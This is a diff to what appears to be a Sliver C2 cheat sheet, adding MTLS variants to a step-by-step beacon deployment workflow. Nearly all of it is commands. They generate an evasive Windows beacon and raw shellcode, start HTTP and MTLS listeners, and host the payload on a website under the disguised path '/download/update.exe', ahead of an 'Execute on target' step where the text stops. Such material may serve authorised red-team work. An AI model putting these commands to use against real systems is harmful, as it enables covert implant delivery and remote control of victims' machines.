@@ -25,16 +25,18 @@ sliver (session) > execute-shellcode -p 1234 shellcode.bin
 
 ## Complete Beacon Deployment Workflow
 
-### Step-by-Step Beacon Deployment via HTTP
+### Step-by-Step Beacon Deployment via HTTP or MTLS
 
 **Step 1: Generate beacon with evasion**
 ```bash
 sliver > generate beacon --http your-server.com:8443 --os windows --evasion --save /path/to/file/
+sliver > generate --mtls your-server --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin
 ```
 
 **Step 2: Start C2 listener**
 ```bash
 sliver > http --lhost 0.0.0.0 --lport 8443
+sliver > mtls -L your-server -l 8888
 ```
 
 **Step 3: Add payload to website**
@@ -44,7 +46,7 @@ sliver > websites add-content --website mysite --web-path /download/update.exe -
 
 **Step 4: Start website server (on different port)**
 ```bash
-sliver > http --website mysite --lhost 0.0.0.0 --lport 80
+sliver > http --website mysite --lhost your-server --lport 80
 ```
 
 **Step 5: Execute on target**
